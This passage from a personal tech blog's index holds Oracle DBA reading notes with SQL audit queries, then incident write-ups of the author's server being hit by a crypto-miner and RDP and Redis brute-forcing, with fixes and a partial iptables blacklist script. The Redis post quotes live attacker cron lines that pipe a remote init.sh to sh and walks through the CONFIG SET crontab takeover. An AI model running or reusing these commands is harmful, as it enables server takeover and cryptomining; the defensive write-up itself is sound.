t.blevel     , t.leaf_blocksfrom dba_indexes twhere index_type in (&#x27;BITMAP&#x27;, &#x27;FUNCTION-BASED NORMAL&#x27;)  and owner in (&#x27;TEST_USER&#x27;);\n\n\n检查CACHE小于20的序列\n-- 检查序CACHE小于20的序列的情况（一般情况下可将其增至1000左右，序列默认的20太小）select t.sequence_name     , t.cache_size     , &#x27;alter sequence &#x27; || t.sequence_owner || &#x27;.&#x27; || t.sequence_name || &#x27; cache 1000;&#x27;from dba_sequences twhere sequence_owner in (&#x27;TEST_USER&#x27;)  AND CACHE_SIZE &lt; 20;\n\n\n分析需要跟踪的表和索引的情况\n查看表大小情况\n-- 记录的大小select count(*)from TANBLE_NAME;-- 物理的大小select segment_name, sum(bytes) / 1024 / 1024from user_segmentswhere segment_name in (&#x27;TANBLE_NAME&#x27;)group by segment_name;\n\n查看表结构情况\n-- 查看表信息select t.table_name     , t.num_rows     , t.blocks     -- t.empty_blocks, --统计信息不收集这个字段，所以不需要这个字段了     , t.degree     , t.last_analyzed     , t.temporary     , t.partitioned     , t.pct_free     , t.tablespace_namefrom user_tables twhere table_name in (&#x27;TABLE_NAME&#x27;);-- 查看分区表相关信息-- 查看分区表相关信息(user_part_tables记录分区的表的信息，user_tab_partitions记录表的分区的信息)-- 以下了解这些表的分区是什么类型的，有多少个分区select t.table_name     , t.partitioning_type     , t.partition_countfrom user_part_tables twhere table_name in (&#x27;TABLE_NAME&#x27;);-- 以下了解这些表以什么列作为分区Select name     , object_type     , column_namefrom user_part_key_columnswhere name in (&#x27;TABLE_NAME&#x27;);-- 以下了解这些表的分区范围是多少SELECT table_name, partition_name, high_value, tablespace_nameFROM user_tab_partitions twhere table_name in (&#x27;TABLE_NAME&#x27;)order by table_name, t.partition_position;\n\n每张表对应有多少个索引，物理多大\nselect t2.table_name     , t1.segment_name     , sum(t1.bytes) / 1024 / 1024from user_segments t1   , user_indexes t2where t1.segment_name = t2.index_name  and t1.segment_type like &#x27;%INDEX%&#x27;  and t2.table_name in (&#x27;T1&#x27;)group by t2.table_name, t1.segment_nameorder by table_name;-- 结构情况（高度、重复度、并行度、叶子高度、聚合因子、记录数、状态、最近分析时间...）select t.table_name     , t.index_name     , t.num_rows     , t.index_type     , t.status     , t.clustering_factor     , t.blevel     , t.distinct_keys     , t.leaf_blocks     , t.uniqueness     , t.degree     , t.last_analyzedfrom user_indexes twhere table_name in (&#x27;TABLE_NAME&#x27;);\n\n查看索引列信息\n-- 以下可以查出来的是索引的列是什么（无论分区表和非分区表都可以查出）select t.table_name, t.index_name, t.column_name, t.column_position, t.DESCENDfrom user_ind_columns twhere table_name in (&#x27;TABLE_NAME&#x27;)order by table_name, index_name, column_position;-- 以下查出的都是分区索引select table_name, index_name, partitioning_type, partition_countfrom user_part_indexeswhere table_name in (&#x27;TABLE_NAME&#x27;)order by table_name, index_name;select index_name, partition_name, status, blevel, leaf_blocksfrom user_ind_partitionswhere index_name in      (select index_name       from user_indexes       where table_name in (&#x27;TABLE_NAME&#x27;));\n\n开发规范 让开发者驾轻就熟sql 编写规范单条SQL长度不宜超过100行\n-- 判断过长 sqlselect sql_id, count(*)from v$sqltextgroup by sql_idhaving count(*) &gt;= 100order by count(*) desc;\n\n\nSQL子查询嵌套不宜超过3层一般来说，子查询嵌套如果超过3层，容易导致$QL语句的解析过于复杂，导致产生错误的执行计划。此外子查询嵌套过多，一般适宜分解成更简单的多条SQL。\n\nSQL表关联需考虑连接和限制条件的索引\ndrop table t purge;create table t asselect *from v$sql_plan;-- 使用Nested Loops Join但是未用到索引的，比较可疑select *from twhere sql_id not in (select sql_id                     from t                     where sql_id in (select sql_id from t where operation = &#x27;NESTED LOOPS&#x27;)                       and (operation like &#x27;%INDEX%&#x27; or object_owner like &#x27;%SYS%&#x27;))  and sql_id in (select sql_id from t where operation = &#x27;NESTED LOOPS&#x27;);\n\n\n尽量避免HNT在代码中出现\n-- 找出非SYS用户用HINT的所有SQL来分析select sql_text     , sql_id     , module     , t.service     , first_load_time     , last_load_time     , executions     , servicefrom v$sql twhere sql_text like &#x27;%/*+%&#x27;  and t.SERVICE not like &#x27;SYS$%&#x27;;\n\n\n同一SQL模块避免出现大量相似之处这种SQL写法一般比较可疑，一般可以优化，比如 WITH 子句等等，所以出现后需引起注意。\n\n用到并行度需谨慎\n表和索引属性设置并行找出被设置成并行属性的表和索引，并修正\nselect t.owner, t.table_name, degreefrom dba_tables twhere t.degree &gt; &#x27;1&#x27;;select t.owner, t.table_name, index_name, degree, statusfrom dba_indexes twhere owner in (&#x27;TEST_USER&#x27;)  and t.degree &gt; &#x27;1&#x27;;-- 有问题就要处理，比如索引有并行，就处理如下：select &#x27;alter index &#x27; || t.owner || &#x27;.&#x27; || index_name || &#x27; noparallel;&#x27;from dba_indexes twhere owner in (&#x27;TEST_USER&#x27;)  and t.degree &gt; &#x27;1&#x27;;\n\nSQL中 HINT 的并行设置属性未设并行，但是 HINT 设并行的SQL\nselect sql_text     , sql_id     , module     , service     , first_load_time     , last_load_time     , executionsfrom v$sql twhere sql_text like &#x27;%parall%&#x27;  and t.SERVICE not like &#x27;SYS$%&#x27;;\n\n\n尽量避免对列进行运算捞取对列进行运算的SQL\nselect sql_text     , sql_id     , module     , t.service     , first_load_time     , last_load_time     , executionsfrom v$sql twhere (upper(sql_text) like &#x27;%TRUNC%&#x27;    or upper(sql_text) like &#x27;%TO_DATE%&#x27;    or upper(sql_text) like &#x27;%SUBSTR%&#x27;)  and t.SERVICE not like &#x27;SYS$%&#x27;;\n\nPL&#x2F;SQL 编写规范注释不少于代码的十分之一注释如果过少，将容易导致开发者后续忘记代码的逻辑，尤其是对新人交接很不利，一般建议注释不少于代码的十分之一。捞取注释少于代码十分之一的程序\nselect *from (select name           , t.type           , sum(case when text like &#x27;%--%&#x27; then 1 else 0 end) / count(*) rate      from user_source t      where type in (&#x27;package body&#x27;, &#x27;procedure&#x27;, &#x27;function&#x27;) -- 包头就算了      group by name, type      having sum(case when text like &#x27;%-%&#x27; then 1 else 0 end) / count(*) &lt;= 1 / 10)order by rate;\n\n\n代码必须提供最小化测试案例于注释中这是一个值得推崇的好习惯，对新人接手熟悉程序尤为有用。\n\n绑定变量\n相似语句需考虑绑定变量这里就不提供脚本了，在前面的“检查系统使用绑定变量的情况”中已提供代码。\n动态SQL最容易遗忘绑定变量一般来说，动态SQL未用绑定变量的情况多半是因为未使用 USING 关键字，所以可用如下脚本来搜索可疑的未用绑定变量的动态SQL。动态SQL未用 USING 有可能未用绑定变量\nselect *from user_sourcewhere name in      (select name       from user_source       where name in (select name from user_source where UPPER(text) like &#x27;%EXECUTE IMMEDIATE%&#x27;))  and name in      (select name from user_source where name in (select name from user_source where UPPER(text) like &#x27;%||%&#x27;))  and name not in      (select name from user_source where name in (select name from user_source where upper(text) not like &#x27;%USING%&#x27;));\n\n\n尽量使用批量提交未使用批量提交，一般都是因为将 commit 写到了循环内。以下语句可查出单个 session 提交次数超过10000次的情况，这么多次很可疑，应该捞取出来进行分析。查询提交次数过多的 SESSION\nselect t1.sid, t1.value, t2.namefrom v$sesstat t1   , v$statname t2--where t2.name like &#x27;%commit%&#x27;where t2.name like &#x27;%user commits%&#x27; --可以只选user commits,其他系统级的先不关心  and t1.STATISTIC# = t2.STATISTIC#  and value &gt; 10000order by value desc;\n\n\n同一过程包中出现重复逻辑块需封装，统一调用这是封装的概念，否则修改统一逻辑，代码可能需要修改多处，不利于维护。\n\n生产环境尽量使用包来封装过程和函数一般来说，只要是正式的产品，就必须使用包。查询未用包的程序逻辑\nselect distinct name, typefrom user_sourcewhere type in (&#x27;PROCEDURE&#x27;, &#x27;FUNCTION&#x27;)order by type;\n\n\n动态SQL编写需设法保存真实SQL动态SQL编写最大的麻烦在于调试困难，因为语句是拼装组合而成的，无论是出现该语句的语法错误还是性能问题，都无法被有效跟踪到。此时考虑将拼装成的$QL记录在某张表里，将会给调试跟踪带来极大的方便。\n设计规范 助设计者运筹帷幄表规范范式\n\n绝大部分场景要遵循第三范式。减少数据冗余\n适当场景考虑反范式。为提高性能\n\n\n不同类表的要点差异\n\n小表（参数配置表）\n一般需要有主键。\n一般需要有约束。\n尽量规划在同一表空间。\n\n\n大表（业务表及日志表）\n尺寸超过10GB需考虑建分区\n分区表中分区个数超过100要注意\n大表尽量要有明确的数据保留策略\n体现在设计文档。\n实现步骤体现在维护脚本中。\n体现在表注释中。\n\n\n大表坚决不允许有触发器\n\n\n\n-- 表大小超过10GB未建分区的select owner     , segment_name     , segment_type     , sum(bytes) / 1024 / 1024 / 1024 object_sizefrom dba_segmentsWHERE segment_type = &#x27;TABLE&#x27; -- 此处说明是普通表，不是分区表，如果是分区表，类型是TABLE PARTITIONgroup by owner, segment_name, segment_typehaving sum(bytes) / 1024 / 1024 / 1024 &gt;= 10order by object_size desc;-- 分区个数超过100个的表select table_owner, table_name, count(*) cntfrom dba_tab_partitionsWHERE table_owner in (&#x27;TEST_USER&#x27;)having count(*) &gt;= 100group by table_owner, table_nameorder by cnt desc;-- 表大小超过10GB，有时间字段，可以考虑在该列上建立分区-- 超过10GB的大表没有时间字段select T1.*, t2.column_name, t2.data_typefrom (select segment_name           , segment_type           , sum(bytes) / 1024 / 1024 / 1024 object_size      from user_segments      WHERE segment_type = &#x27;TABLE&#x27; --此处说明是普通表，不是分区表，如果是分区表，类型是TABLE PARTITION      group by segment_name, segment_type      having sum(bytes) / 1024 / 1024 / 1024 &gt;= 0.01      order by object_size desc) t1   , user_tab_columns t2where t1.segment_name = t2.table_name(+)  and t2.DATA_TYPE = &#x27;DATE&#x27;-- 来说明这个大表有时间列-- 上述语句和下面的语句进行观察比较 下面只是过滤了大小select segment_name     , segment_type     , sum(bytes) / 1024 / 1024 / 1024 object_sizefrom user_segmentsWHERE segment_type = &#x27;TABLE&#x27; -- 此处说明是普通表，不是分区表，如果是分区表，类型是TABLE PARTITIONgroup by segment_name, segment_typehaving sum(bytes) / 1024 / 1024 / 1024 &gt;= 0.01order by object_size desc;-- 找出有建触发器的表，同时观察该表多大select trigger_name, table_name, tab_sizefrom user_triggers t1   , (select segment_name, sum(bytes / 1024 / 1024 / 1024) tab_size      from user_segments t      where t.segment_type = &#x27;TABLE&#x27;      group by segment_name) t2where t1.TABLE_NAME = t2.segment_name;\n\n注：触发器是一种存储在数据库中的程序，它定义了一组SQL语句，当特定的事件发生时自动执行这组SQL语句。这些事件通常是数据操作语言（DML）事件，如INSERT、UPDATE或DELETE操作。触发器可以用来强制执行复杂的业务规则或者维护数据完整性，例如级联更新或删除相关的行，或者记录审计日志等。\n为什么大表不要有触发器？\n\n性能影响：\n当对大表进行大量的DML操作时，触发器会在每个受影响的行上被执行，这会导致额外的CPU和I&#x2F;O负载。如果触发器内含有复杂的逻辑或者需要访问其他表，则性能影响会更加严重。\n在高并发环境下，多个事务同时尝试修改大表中的数据，触发器的执行可能导致更多的锁等待，从而增加事务处理的时间。\n\n\n可扩展性问题：\n随着表的增长，触发器的开销也会变得越来越显著。对于大规模的数据修改操作，触发器可能导致长时间的锁定，进而影响整个系统的响应时间和吞吐量。\n\n\n维护复杂性：\n触发器使得数据库逻辑变得复杂，特别是在涉及多表或多步骤操作的情况下。维护触发器代码的正确性和效率也变得更加困难。\n\n\n\n\n表结构\n\n注释\n表必须要有注释\n列尽量要有注释\n\n\n列类型\n避免使用LONG字段。可以说，现在的应用中，LONG字段几乎是有百害而无一利，所以尽量要杜绝在设计中出现LONG,一般考虑CLOB字段来替代。\n避免用CHAR字段。CHAR字段的应用场合非常少，一般现在都考虑用VARCHAR2来替代。\n列类型和值尽量匹配\n时间取值放入 date 列。\n数字取值放入 number 列。\n字符串取值放入 varchar2 列。\n\n\n\n\n\n-- 查询那些表未做注释select TABLE_NAME, T.TABLE_TYPEfrom USER_TAB_COMMENTS Twhere table_name not like &#x27;BIN$%&#x27;  and comments is nullorder by table_name;-- 查询哪些列未做注释（仅供参考)select TABLE_NAME, COLUMN_NAMEfrom USER_COL_COMMENTSwhere table_name not like &#x27;BIN$%&#x27;  and comments is nullorder by table_name;-- 查询哪些列是LONG类型SELECT TABLE_NAME, COLUMN_NAME, DATA_TYPEFROM user_tab_columnsWHERE DATA_TYPE = &#x27;LONG&#x27;ORDER BY 1, 2;-- 查询哪些列是CHAR类型SELECT TABLE_NAME, COLUMN_NAME, DATA_TYPEFROM user_tab_columnsWHERE DATA_TYPE = &#x27;CHAR&#x27;ORDER BY 1, 2;\n\n索引规范用不上分区条件的局部索引不宜建分区表建了分区索引后，如果在查询应用中无法用到这个分区索引列的条件，索引读将可能遍历所有的分区。如果有100个分区，相当于遍历了100个小索引，将会严重影响性能，此时需要慎重考虑，判断是否需要修改为全局索引。\n\n函数索引大多用于列运算，一般需要避免从实际应用情况来分析，应用函数索引大多是因为设计阶段考虑步骤，比如 trunc(时间列) 的写法，往往可以轻易转换成去掉 trunc的写法，所以需要捞取出来验证。\n-- 查询哪些索引是函数索引select t.index_name     , t.index_type     , t.status     , t.blevel     , t.leaf_blocksfrom user_indexes twhere index_type in (&#x27;FUNCTION-BASED NORMAL&#x27;);\n\n\n位图索引遇到更新将是噩梦，需谨慎设计\n\n位图索引不适合用在表频繁更新的场合。\n位图索引不适合在所在列重复度很低的场合。\n\n因为位图索引的应用比较特殊，适用场合比较少，因此有必要捞取出系统中的位图索引，进行核对检测。\n-- 查询哪些索引是位图索引select t.index_name     , t.index_type     , t.status     , t.blevel     , t.leaf_blocksfrom user_indexes twhere index_type in (&#x27;BITMAP&#x27;);\n\n\n外键未建索引将引发死锁及影响表连接性能外键未建索引，将有可能导致两个严重的问题：一是更新相关的表产生死锁；二是两表关联查询时性能低下。因此设计中需要谨慎考虑。\n-- 查询外键未建索引的表有哪些select table_name     , constraint_name     , cname1 || nvl2(cname2, &#x27;,&#x27; || cname2, null) ||       nvl2(cname3, &#x27;,&#x27; || cname3, null) ||       nvl2(cname4, &#x27;,&#x27; || cname4, null) ||       nvl2(cname5, &#x27;,&#x27; || cname5, null) ||       nvl2(cname6, &#x27;,&#x27; || cname6, null) ||       nvl2(cname7, &#x27;,&#x27; || cname7, null) ||       nvl2(cname8, &#x27;,&#x27; || cname8, null) columnsfrom (select b.table_name           , b.constraint_name           , max(decode(position, 1, column_name, null)) cname1           , max(decode(position, 2, column_name, null)) cname2           , max(decode(position, 3, column_name, null)) cname3           , max(decode(position, 4, column_name, null)) cname4           , max(decode(position, 5, column_name, null)) cname5           , max(decode(position, 6, column_name, null)) cname6           , max(decode(position, 7, column_name, null)) cname7           , max(decode(position, 8, column_name, null)) cname8           , count(*)                                    col_cnt      from (select substr(table_name, 1, 30)      table_name                 , substr(constraint_name, 1, 30) constraint_name                 , substr(column_name, 1, 30)     column_name                 , position            from user_cons_columns) a         , user_constraints b      where a.constraint_name = b.constraint_name        and b.constraint_type = &#x27;R&#x27;      group by b.table_name, b.constraint_name) conswhere col_cnt &gt; ALL      (select count(*)       from user_ind_columns i       where i.table_name = cons.table_name         and i.column_name in (cname1, cname2, cname3, cname4, cname5,                               cname6, cname7, cname8)         and i.column_position &lt;= cons.col_cnt       group by i.index_name);\n\n\n建联合索引需谨慎\n要结合单列查询考虑，决定前缀如：既可以建立col1,col2的联合索引，又可以建立col2,col1的联合索引，此时如果存在col1列单独查询较多的情况下，一般倾向于建立col1,col2的联合索引。\n范围查询影响组合索引组合查询中，如果有等值条件和范围条件组合的情况，等值条件在前，性能更高。如：where col1&#x3D;2 and col2&gt;&#x3D;100 and col2&lt;&#x3D;120,此时是col1,col2的组合索引性能高过col2,col1的组合索引。\n-- 将有不等值查询的SQL捞取出来分析select sql_text     , sql_id     , service     , module     , t.first_load_time     , t.last_load_timefrom v$sql twhere (sql_text like &#x27;%&gt;%&#x27; or sql_text like &#x27;%&lt;%&#x27; or sql_text like &#x27;%&lt;&gt;%&#x27;)  and sql_text not like &#x27;%=&gt;%&#x27;  and service not like &#x27;SYS$%&#x27;;\n\n需考虑回表因素一般情况下，如果建索引可以避免回表（在索引中即可完成检测），也可考虑对多列建组合索引，不过组合索引列不宜超过4个。\n超过4个字段的联合索引需注意\n-- 捞取超过4个字段组合的联合索引select table_name, index_name, count(*)from user_ind_columnsgroup by table_name, index_namehaving count(*) &gt;= 4order by count(*) desc;\n\n\n单表索引个数需控制\n索引个数超过5个以上的超过5个以上的索引，在表的记录很大时，将会极大地影响该表的更新，因此在表中建索引时需要谨慎考虑。\n-- 单表的索引个数超过5个需注意select table_name, count(*)from user_indexesgroup by table_namehaving count(*) &gt;= 5order by count(*) desc;\n\n建后2个月内从未使用过的索引一般来说，在2个月内从未被用到的索引是多余的索引，可以考虑删除。\n-- 跟踪索引的使用情况，控制索引的数量select &#x27;alter index &#x27; || index_name || &#x27; monitoring usage;&#x27;from user_indexes;-- 然后观察：select *from v$object_usage;-- 停止对索引的监控，观察v$object_usage状态变化（以某索引IDX_OBJECT_ID为例）alter index IDX_OBJECT_ID nomonitoring usage;\n\n\n单表无任何索引需重视单表无任何索引的情况一般比较少见，可以捞取出来，再结合SQL应用进行分析，观察该表的大小以及是否有时间字段及编码字段这样的适宜建索引的列。\n-- 查询无任何索引的表select table_namefrom user_tableswhere table_name not in (select table_name from user_indexes);\n\n\n需注意索引的失效情况\n\n对表进行move操作，会导致索引失效，操作需考忠索引的重建。\n对分区表进行系列操作，如 split、drop、truncate 分区时，容易导致分区表的全局索引失效，需要考虑增加update global indexes的关键字进行操作，或者重建索引。\n分区表SPLIT的时候，如果MAX区中已经有记录了，这个时候SPLIT就会导致有记录的新增分区的局部索引失效。\n\n普通表及分区表的全局索引失效\n-- 查询失效的普通索引select index_name, table_name, tablespace_name, index_typefrom user_indexeswhere status = &#x27;UNUSABLE&#x27;;\n\n分区表局部索引失效\n-- 查询失效的分区局部索引select t1.index_name     , t1.partition_name     , t1.global_stats     , t2.table_name     , t2.table_typefrom user_ind_partitions t1   , user_indexes t2where t2.index_name = t1.index_nameand t1.status =&#x27;UNUSABLE&#x27;;\n\n环境参数规范数据库参数\nSGA及PGA参数\nOLTP应用是主机内存的80%分配数据库，其中 SGA80%,PGA20%。OLAP应用是主机内存的80%分配数据库，其中 SGA50%,PGA50%。如OLTP应用：主机内存30GB,SGA即是 30 X 0.8 X 0.8 &#x3D; 20GB 左右。不过这里还是要注意：并没有什么黄金参数，这些还只能是参考。\nPROCESS&#x2F;SESSION\n-- 默认连接数是150，这对大多数应用都无法满足，大型应用一般不少于1000个。show parameter processshow parameter sessionselect count(*)from v$process;select count(*)from v$session;\n\n\nOPEN_CURSOR游标参数\n-- 默认open_cursors是300，大型应用需设置1000以上，原则上不超过PROCESS设置。show parameter open_cursor\n\n日志参数一般来说，Oracle默认的日志参数是3组，大小为500MB,在实际较大的生产应用中往往不够，需要至少考虑在5组以上，大小在1GB以上。\n-- 生产系统大多需要开启归档。archive log list\n\n\n表空间规划\n\n回滚表空间\n自动管理。\n避免自动扩展。\n尽可能规划大一些。\n\n\n临时表空间\n避免自动扩展。\n尽可能大。\n尽可能使用临时表空间组。\n\n\n业务表空间\n控制个数，不超过6个为宜。\n尽量避免自动扩展，超阀值由监控来检查。\n根据自己的业务，固定表空间名。\n表空间需良好分类（参数配置表，业务数据表，历史记录表）。\n表空间需合理命名。\n\n\n\n\nRAC系统\n\n尽量采用BALANCE模式，保证两节点压力大致相当。\n可适当考虑不同类型的业务部署在不同的节点上，避免RAC的CACHE争用。\n尽量考虑不同的节点使用不同的临时表空间。\n\n命名规范只是示范，一般都有自己的命名方式，但团队要有统一的规范。\n-- 查询表的前缀是否以t_开头select*from user_tableswhere substr(table_name, 1, 2) &lt;&gt; &#x27;T_&#x27;;-- 查询视图的前缀是否以v_开头select view_namefrom user_viewswhere substr(view_name, 1, 2) &lt;&gt; &#x27;V_&#x27;;-- 查询同义词的前缀是否以s_开头select synonym_name, table_owner, table_namefrom user_synonymswhere substr(synonym_name, 1, 2) &lt;&gt; &#x27;S_&#x27;;-- 查询簇表的前缀是否以c_开头select t.cluster_name, t.cluster_typefrom user_clusters twhere substr(cluster_name, 1, 2) &lt;&gt; &#x27;C_&#x27;;-- 查询序列的前缀是否以seq开头或结尾select sequence_name, cache_sizefrom user_sequenceswhere sequence_name not like &#x27;%SEQ%&#x27;;-- 查询存储过程是否以p_开头select object_name, procedure_namefrom user_procedureswhere object_type = &#x27;PROCEDURE&#x27;  and substr(object_name, 1, 2) &lt;&gt; &#x27;P_&#x27;;-- 查询函数是否以f_开头select object_name, procedure_namefrom user_procedureswhere object_type = &#x27;FUNCTION&#x27;  and substr(object_name, 1, 2) &lt;&gt; &#x27;F_&#x27;;-- 查询包是否以pkg开头select object_name, procedure_namefrom user_procedureswhere object_type = &#x27;PACKAGE&#x27;  and substr(object_name, 1, 4) &lt;&gt; &#x27;PKG&#x27;;-- 查询类是否以typ开头select object_name, procedure_namefrom user_procedureswhere object_type = &#x27;TYPE&#x27;  and substr(object_name, 1, 4) &lt;&gt; &#x27;TYP&#x27;;-- 查询主键是否以pk_开头select constraint_name, table_namefrom user_constraintswhere constraint_type = &#x27;p&#x27;  and substr(constraint_name, 1, 3) &lt;&gt; &#x27;PK_&#x27;  and constraint_name not like &#x27;BINS%&#x27;;-- 查询外键是否以fk_开头select constraint_name, table_namefrom user_constraintswhere constraint_type = &#x27;R&#x27;  and substr(constraint_name, 1, 3) &lt;&gt; &#x27;FK_&#x27;  and constraint_name not like &#x27;BINS%&#x27;;-- 查询唯一索引是否以ux_开头select constraint_name, table_namefrom user_constraintswhere constraint_type = &#x27;U&#x27;  and substr(constraint_name, 1, 3) &lt;&gt; &#x27;UX_&#x27;  and table_name not like &#x27;BINS%&#x27;;-- 查询普通索引是否以idx_开头select index_name, table_namefrom user_indexeswhere index_type = &#x27;NORMAL&#x27;  and uniqueness = &#x27;NONUNIQUE&#x27;  and substr(index_name, 1, 4) &lt;&gt; &#x27;IDX_&#x27;  and table_name not like &#x27;BINS%&#x27;;-- 查询位图索引是否以bx_开头select index_name, table_namefrom user_indexeswhere index_type LIKE &#x27;%BIT%&#x27;  and substr(index_name, 1, 3) &lt;&gt; &#x27;BX_&#x27;  and table_name not like &#x27;BINS%&#x27;;-- 查询函数索引是否以fx_开头select index_name, table_namefrom user_indexeswhere index_type = &#x27;FUNCTION-BASED NORMAL&#x27;  and substr(index_name, 1, 3) &lt;&gt; &#x27;FX_&#x27;  and table_name not like &#x27;BINS%&#x27;;\n\nEND终于是结束了，算是第一本静下心来读完的技术相关的书。从git提交记录也可以看出，读了快两个月，中间有半个多月的空窗。是有点看不到下去了，是最艰难的索引章节，一章就占了全书的四分之一还多。前面体系结构、逻辑结构里的sql还能基本都在自己搭的测试环境中验证下，但到索引很多都没有去验证，实在是太多了。算是个偷懒的地方吧，不过最后还是读完了。\n这本书的作者 梁敬彬、梁敬弘 后面还写了一本 《收获，不止SQL优化》，等缓一缓，后面肯定会继续读的。先整点非技术相关的书，或者非数据库相关的书调节一下。就这样，Bye\n","categories":["读书笔记"],"tags":["数据库","《收获，不止Oracle》","Oracle"]},{"title":"云服日常被攻击（一、二）","url":"/%E7%BC%96%E7%A8%8B%E8%AE%B0%E5%BD%95/%E4%BA%91%E6%9C%8D%E6%97%A5%E5%B8%B8%E8%A2%AB%E6%94%BB%E5%87%BB%EF%BC%88%E4%B8%80%E3%80%81%E4%BA%8C%EF%BC%89/","content":"被攻击经历一第一次被攻击是在2022年11月12日，16点39分。手机突然收到了腾讯云的短信，有恶意文件。然后干的第一件事就是从小程序把服务器停了（服务器上没啥重要服务，纯用来练手玩的一些东西后来就是上服务器排查哪出的问题，最后发现是账号密码被爆破了。\n由于大创项目的原因，服务器是三个人一起用的，我给那俩人都创建了账号，权限也都给了。关键的点来了，其中一个账号密码是 123456 ，属于是绷不住了。因为恶意文件的创建者都是那个账号，所以确定是这个账户密码泄露了。\n恶意文件是用于挖矿的 shell 。开机就给我 cpu 干满了，属于是毫不遮掩了。后续就是重装了系统，并且使用强密码。（后面要说，其实用处不大\n还有要说的就是它的攻击方式爆破用户名和密码，挺低级的。不过肯定是用被攻陷的肉鸡去爆破，同时还挖矿，吃满资源。我恨挖矿的，真该死啊\n被攻击经历二第二次被攻击是在2023年12月18日发现的，但是并没有造成影响。这次我的应用是跑在 docker 容器中的。那天发现 redis 里有这几个奇怪的 string。这定时任务显然是有巨大问题的，不是我的程序写进去的。\n*/2 * * * * root cd1 -fsSL http://45.83.123.29/cleanfda/init.sh | sh*/3 * * * * root wget -q -O- http://45.83.123.29/cleanfda/init.sh | sh*/4 * * * * root curl -fsSL http://en2an.top/cleanfda/init.sh | sh*/5 * * * * root wd1 -q -O- http://en2an.top/cleanfda/init.sh | sh\n\n然后去了这些网址看了看都是下载了什么 shell 脚本。一看，好家伙！又是挖矿的。（这群人真该死啊下面这篇文章讲了关于 redis 的安全问题，也包含了我这次被攻击的攻击细节。Databases. EXPOSED! (Redis)\n详细的就去看上面的文章吧。下面简单讲下攻击原理。最开始也是爆破，不过这次爆破的是暴露在公网上的 redis 服务。（建议换个端口，不使用默认的 6379，不过用处不是很大至于为什么会选择 redis ，也许 redis 配置文件的注释就给出了答案。\n# Warning: since Redis is pretty fast an outside user can try up to# 150k passwords per second against a good box. This means that you should# use a very strong password otherwise it will be very easy to break.# 警告：由于Redis速度相当快，外部用户每秒可以在一个好盒子上尝试多达150k个密码。这意味着你应该使用一个非常强的密码，否则很容易被破解。\n所以即便我的密码是强密码 ~Dx33ZWi&gt;}d8LFvwuZKo ，但是丝毫不影响被爆破出来。（只是它花的时间会更久一些。进入 redis 后，会执行 FLUSHALL 删除 redis 服务器上的所有数据。这样做是为了使以下键&#x2F;值的内容尽可能靠近数据库文件的开头写入。然后写入类似上面的键值对 SET backup1 “\\n\\n\\n*&#x2F;4 * * * * root curl -fsSL http://45.83.123.29/cleanfda/init.sh | sh\\n\\n\\n”执行 CONFIG SET dir “&#x2F;var&#x2F;spool&#x2F;cron&#x2F;“ 将 redis 的 data 目录设置为系统的 “&#x2F;var&#x2F;spool&#x2F;cron&#x2F;“ 目录，默认目录是 “crond” 进程找到并执行单个用户 crontabs 的目录。执行 CONFIG SET dbfilename “root” 将 redis 的数据文件名设置为 “root”，这意味着数据库的内容将存储在 “&#x2F;var&#x2F;spool&#x2F;cron&#x2F;root” 中，即 root 用户的个人 crontab 文件。最后执行 save 使 redis 服务器将内存同步到磁盘，如果成功，crontab 进程将读取并执行 “&#x2F;var&#x2F;spool&#x2F;cron&#x2F;root” 的内容。\n到这里，服务器就不属于你了。除了写入定时任务脚本以启动进程，也可以写入 .ssh&#x2F;authorized_keys 文件来添加密钥。\n修复建议如那篇文章所说：\n\nEnable client authentication in your Redis configuration file.在Redis配置文件中启用客户端身份验证。\nConfigure Redis to only run on internal-facing network interfaces.将Redis配置为只在面向内部的网络接口上运行。\nDisable the “CONFIG” command by running ‘rename-command CONFIG “”’ to avoid configuration abuse.通过运行”rename-command CONFIG”禁用”CONFIG”命令，以避免配置滥用。\nConfigure your firewall only to accept Redis connections from trusted hosts.配置防火墙只接受来自可信主机的Redis连接。\n\n最后，挖矿的真该死啊！\n","categories":["编程记录"],"tags":["网络安全","云服务器"]},{"title":"云服日常被攻击（三）","url":"/%E7%BC%96%E7%A8%8B%E8%AE%B0%E5%BD%95/%E4%BA%91%E6%9C%8D%E6%97%A5%E5%B8%B8%E8%A2%AB%E6%94%BB%E5%87%BB%EF%BC%88%E4%B8%89%EF%BC%89/","content":"过程又又又被攻击了，这次是通过stp挂在公网的rdp。方便我远程访问家里云。\n起初是看到了v站的一篇帖子：求助，被入侵了，如何减小损失？大致内容就是他通过ftp挂在公网的rdp被入侵了，常用的网站密码都泄露了。\n然后我就想起来，这人的操作和我一样啊。赶紧上服务器看下日志：\n看到日志这么大我就知道坏了，进去翻了一下，基本就是几个ip一直在连接：\n再去翻一下家里云windows的日志：\n基本就是用几个用户名在一直尝试，总共试了三万多次，我看日志的时候还在试是最难绷的。把ftp服务听了之后，想想有什么办法防止这种情况。\nwindows的服务被暴露出来，首先肯定是从windows源头入手，看看有什么办法阻断。看了windows的安全策略，默认多次登陆失败后账户会被锁定10分钟。这个调不调整问题也不大，因为它似乎跑的是字典，连我的用户名都没试出来。（试出来的概率也不大另外就是加ip黑名单，这个不现实。因为ftp服务，所有的请求都是从公网的服务器转发来的。\n但是在服务器的层面加ip黑名单是可以的。bash脚本我就不是很熟了，连夜和gpt一起写了个脚本，检测ftp的日志，把频繁访问的都加到防火墙的ip黑名单里。最后配置个定时任务运行脚本。就完成了。\nbash 脚本#!/bin/bash# 配置参数LOG_FILE=&quot;/home/ubuntu/frp/frp_0.56.0_linux_amd64/frps.log&quot;  # 日志文件路径THRESHOLD=20                         # 黑名单阈值BLACKLIST_FILE=&quot;/home/ubuntu/frp/blacklist.txt&quot;  # 黑名单文件路径CHAIN_NAME=&quot;FTP-BLACKLIST&quot;        # 自定义防火墙链名称# 创建自定义防火墙链（如果不存在）iptables -L $CHAIN_NAME &amp;&gt; /dev/nullif [[ $? -ne 0 ]]; then  echo &quot;创建自定义链: $CHAIN_NAME&quot;  iptables -N $CHAIN_NAME  # 确保 INPUT 链引用自定义链  iptables -I INPUT -j $CHAIN_NAMEfi# 提取日志中的 IP 地址并统计echo &quot;解析日志文件：$LOG_FILE&quot;declare -A ip_countswhile read -r line; do  # 从日志中提取 IP  ip=$(echo &quot;$line&quot; | grep -oP &#x27;\\b(?:[0-9]&#123;1,3&#125;\\.)&#123;3&#125;[0-9]&#123;1,3&#125;\\b&#x27;)  if [[ -n &quot;$ip&quot; ]]; then    ip_counts[&quot;$ip&quot;]=$((ip_counts[&quot;$ip&quot;] + 1))  fidone &lt; &quot;$LOG_FILE&quot;# 遍历统计结果，筛选频率超过 